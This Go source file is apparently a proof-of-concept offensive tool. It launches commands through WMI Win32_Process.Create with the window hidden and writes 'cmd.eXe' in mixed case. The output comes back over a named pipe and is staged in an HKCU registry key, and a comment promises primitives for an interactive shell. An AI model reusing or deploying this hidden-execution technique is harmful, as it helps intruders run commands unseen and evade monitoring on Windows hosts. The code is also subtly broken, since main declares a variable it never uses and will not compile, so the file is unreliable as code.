package main

// perform wmi code execution using NamedPipe 
// store output in HKLM/CU/PoC
// + 2 r/w primitives for interactive shell

import (
	"fmt"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func main() {
	out, err := execWMIAndStore("ipconfig")
	if err != nil {
		fmt.Println("ERROR:", err)
		return
	}
}

// execWMIAndStore output using NamedPipe
func execWMIAndStore(cmd string) (string, error) {
	pipeName := fmt.Sprintf(`\\.\pipe\poc_%d`, time.Now().UnixNano())

	pipe, err := windows.CreateNamedPipe(
		windows.StringToUTF16Ptr(pipeName),
		windows.PIPE_ACCESS_INBOUND,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1,
		8192,
		8192,
		0,
		nil,
	)
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(pipe)

	psCmd := fmt.Sprintf(
		`cmd.eXe /c "%s" 1> %s 2>&1`,
		cmd,
		pipeName,
	)

	if err := wmiCreateHiddenProcess(psCmd); err != nil {
		return "", err
	}

	if err := windows.ConnectNamedPipe(pipe, nil); err != nil {
		return "", err
	}

	buf := make([]byte, 0, 16384)
	tmp := make([]byte, 4096)

	for {
		n, err := windows.Read(pipe, tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
		}
		if err != nil || n == 0 {
			break
		}
	}

	output := string(buf)

	if err := writeRegistry(output); err != nil {
		return "", err
	}

	return readRegistry()
}

// wmiCreateHiddenProcess launches a process via WMI with no visible window
func wmiCreateHiddenProcess(command string) error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	locatorObj, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return err
	}
	defer locatorObj.Release()

	locator, _ := locatorObj.QueryInterface(ole.IID_IDispatch)
	defer locator.Release()

	serviceRaw, err := oleutil.CallMethod(locator, "ConnectServer", nil, "root\\cimv2")
	if err != nil {
		return err
	}
	service := serviceRaw.ToIDispatch()
	defer service.Release()

	processRaw, err := oleutil.CallMethod(service, "Get", "Win32_Process")
	if err != nil {
		return err
	}
	process := processRaw.ToIDispatch()
	defer process.Release()

	startupRaw, err := oleutil.CallMethod(service, "Get", "Win32_ProcessStartup")
	if err != nil {
		return err
	}
	startup := startupRaw.ToIDispatch()
	defer startup.Release()

	// Hide window completely
	oleutil.PutProperty(startup, "ShowWindow", 0)

	_, err = oleutil.CallMethod(
		process,
		"Create",
		command,
		nil,
		nil,
		startup,
	)
	return err
}

// writeRegistry writes output to HKCU\\Software\\PoC
func writeRegistry(data string) error {
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\PoC`,
		registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer k.Close()

	return k.SetStringValue("Output", data)
}

// readRegistry reads output from HKCU\\Software\\PoC
func readRegistry() (string, error) {
	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\PoC`,
		registry.QUERY_VALUE,
	)
	if err != nil {
		return "", err
	}
	defer k.Close()

	val, _, err := k.GetStringValue("Output")
	return val, err
}
